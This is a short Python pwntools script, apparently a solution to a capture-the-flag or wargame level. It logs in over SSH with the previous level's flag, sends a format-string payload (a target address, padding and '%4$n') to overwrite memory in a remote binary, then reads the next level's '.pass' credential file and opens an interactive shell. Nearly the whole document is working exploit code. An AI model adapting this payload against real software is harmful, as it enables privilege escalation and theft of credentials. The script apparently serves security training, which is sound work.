#!/usr/bin/env python3

from pwn import *
import os

host = input("Enter host IP: ")
port = 4242
login = "level3"
binary = login
target_login = "level4"

flag_file = os.path.abspath(os.path.join(os.getcwd(), "level2/flag"))
password = open(flag_file, "r").read().strip()

shell = ssh(host=host, port=port, user=login, password=password)

remotebinary = f"/home/user/{login}/{binary}"

# Payload Construction
address = b"\x8c\x98\x04\x08"
padding = b"A" * 60
fmt = b"%4$n"

payload = address + padding + fmt

p = shell.process(remotebinary)
p.sendline(payload)
p.sendline(b"cat /home/user/" + target_login.encode() + b"/.pass")

p.interactive()
